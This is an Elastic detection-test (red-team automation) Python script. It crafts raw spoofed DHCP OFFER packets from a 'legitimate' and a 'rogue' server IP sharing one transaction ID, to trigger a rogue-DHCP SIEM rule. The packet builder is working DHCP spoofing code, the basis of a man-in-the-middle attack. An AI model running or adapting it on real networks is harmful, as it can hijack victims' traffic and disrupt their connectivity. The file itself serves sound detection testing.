# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Multiple DHCP Servers Responding to the Same Transaction
# RTA: network_dhcp_multiple_servers_same_transaction.py
# Description: Emulates a rogue DHCP server race condition by crafting two
#              raw IP/UDP DHCP OFFER packets that share the same transaction ID
#              (xid) but originate from two distinct source IP addresses.
#              Packetbeat / network_traffic capturing UDP/67-68 will decode
#              both packets as DHCP OFFER events with the same
#              dhcpv4.transaction_id but different source.ip values, satisfying
#              the COUNT_DISTINCT(source.ip) >= 2 condition in the rule.
#
#              Source IPs are private RFC1918 addresses simulating a legitimate
#              DHCP server (192.168.1.1) and a rogue one (192.168.1.254). Both
#              packets are broadcast to 255.255.255.255:68 on the wire.
#
#              Requires CAP_NET_RAW (typically root). The kernel may drop
#              packets with non-local source IPs depending on RP filtering;
#              the network sensor only needs to observe the packets on egress to
#              produce flow events. SO_BROADCAST is required for the 255.255.255.255
#              destination.
#
#              This covers the network precondition for CVE-2026-44815 and
#              classic DHCP spoofing (T1557.003).

import logging
import os
import random
import socket
import struct
import time

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)

DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68
DHCP_BROADCAST_IP = "255.255.255.255"
DHCP_MAGIC_COOKIE = 0x63825363

# Two distinct server IPs — one "legitimate", one "rogue"
LEGITIMATE_SERVER_IP = "192.168.1.1"
ROGUE_SERVER_IP = "192.168.1.254"

OFFERED_CLIENT_IP = "192.168.1.100"
FAKE_CLIENT_MAC = b"\xde\xad\xbe\xef\x00\x01"


def _ones_complement_sum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s & 0xFFFF) + (s >> 16)
    s += s >> 16
    return ~s & 0xFFFF


def _build_dhcp_offer_packet(src_ip: str, xid: int) -> bytes:
    """Build a raw IP/UDP DHCP OFFER packet with the given source IP and xid."""
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(DHCP_BROADCAST_IP)
    offered_bytes = socket.inet_aton(OFFERED_CLIENT_IP)

    # BOOTP/DHCP fixed header (236 bytes)
    dhcp_fixed = struct.pack(
        "!BBBBIHH4s4s4s4s16s64s128s",
        2,                              # op: BOOTREPLY
        1,                              # htype: Ethernet
        6,                              # hlen: 6 bytes MAC
        0,                              # hops
        xid,                            # transaction ID (same for both packets)
        0,                              # secs
        0x8000,                         # flags: broadcast
        b"\x00\x00\x00\x00",           # ciaddr
        offered_bytes,                  # yiaddr: offered IP
        src_bytes,                      # siaddr: next server IP
        b"\x00\x00\x00\x00",           # giaddr
        FAKE_CLIENT_MAC + b"\x00" * 10, # chaddr: 16 bytes
        b"\x00" * 64,                   # sname
        b"\x00" * 128,                  # file
    )

    # DHCP options
    dhcp_options = struct.pack("!I", DHCP_MAGIC_COOKIE)
    dhcp_options += struct.pack("!BBB", 53, 1, 2)                           # Option 53: OFFER
    dhcp_options += struct.pack("!BB4s", 54, 4, src_bytes)                  # Option 54: server identifier
    dhcp_options += struct.pack("!BBI", 51, 4, 86400)                       # Option 51: lease time 24h
    dhcp_options += struct.pack("!BB4s", 1, 4, socket.inet_aton("255.255.255.0"))  # Option 1: subnet mask
    dhcp_options += struct.pack("!BB4s", 3, 4, src_bytes)                   # Option 3: router (self)
    dhcp_options += b"\xff"                                                  # Option 255: End

    dhcp_payload = dhcp_fixed + dhcp_options

    # UDP header with pseudo-header checksum
    udp_length = 8 + len(dhcp_payload)
    pseudo = struct.pack("!4s4sBBH", src_bytes, dst_bytes, 0, socket.IPPROTO_UDP, udp_length)
    udp_header_no_csum = struct.pack("!HHHH", DHCP_SERVER_PORT, DHCP_CLIENT_PORT, udp_length, 0)
    udp_checksum = _ones_complement_sum(pseudo + udp_header_no_csum + dhcp_payload)
    udp_header = struct.pack("!HHHH", DHCP_SERVER_PORT, DHCP_CLIENT_PORT, udp_length, udp_checksum)

    # IP header
    ip_total_len = 20 + udp_length
    ident = random.randint(0, 0xFFFF)
    ip_header_no_csum = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_UDP, 0, src_bytes, dst_bytes,
    )
    ip_checksum = _ones_complement_sum(ip_header_no_csum)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, ident, 0, 64, socket.IPPROTO_UDP, ip_checksum, src_bytes, dst_bytes,
    )

    return ip_header + udp_header + dhcp_payload


@register_code_rta(
    id="56c82e6e-bb4a-4b7f-b0bf-74a316bce21b",
    name="network_dhcp_multiple_servers_same_transaction",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="44b8d933-8fed-485d-a0af-bd97d0093439",
            name="Multiple DHCP Servers Responding to the Same Transaction",
        )
    ],
    techniques=["T1190", "T1557", "T1557.003"],
)
def main() -> None:
    """Send two DHCP OFFER packets with the same xid from two distinct source IPs."""
    if os.geteuid() != 0:
        log.error("Raw socket privileges required (run as root or with CAP_NET_RAW)")
        return

    xid = random.randint(0x10000000, 0xEFFFFFFF)
    log.info(
        "DHCP rogue-server emulation: xid=0x%08x, legitimate=%s, rogue=%s",
        xid, LEGITIMATE_SERVER_IP, ROGUE_SERVER_IP,
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    try:
        for label, src_ip in (
            ("legitimate", LEGITIMATE_SERVER_IP),
            ("rogue", ROGUE_SERVER_IP),
        ):
            packet = _build_dhcp_offer_packet(src_ip, xid)
            log.info(
                "Sending DHCP OFFER from %s server (%s) xid=0x%08x -> %s:%d",
                label, src_ip, xid, DHCP_BROADCAST_IP, DHCP_CLIENT_PORT,
            )
            try:
                _ = sock.sendto(packet, (DHCP_BROADCAST_IP, DHCP_CLIENT_PORT))
                log.info("DHCP OFFER emitted from %s", src_ip)
            except OSError as e:
                log.error("Failed to send DHCP OFFER from %s: %s", src_ip, e)
            time.sleep(0.1)
    finally:
        sock.close()
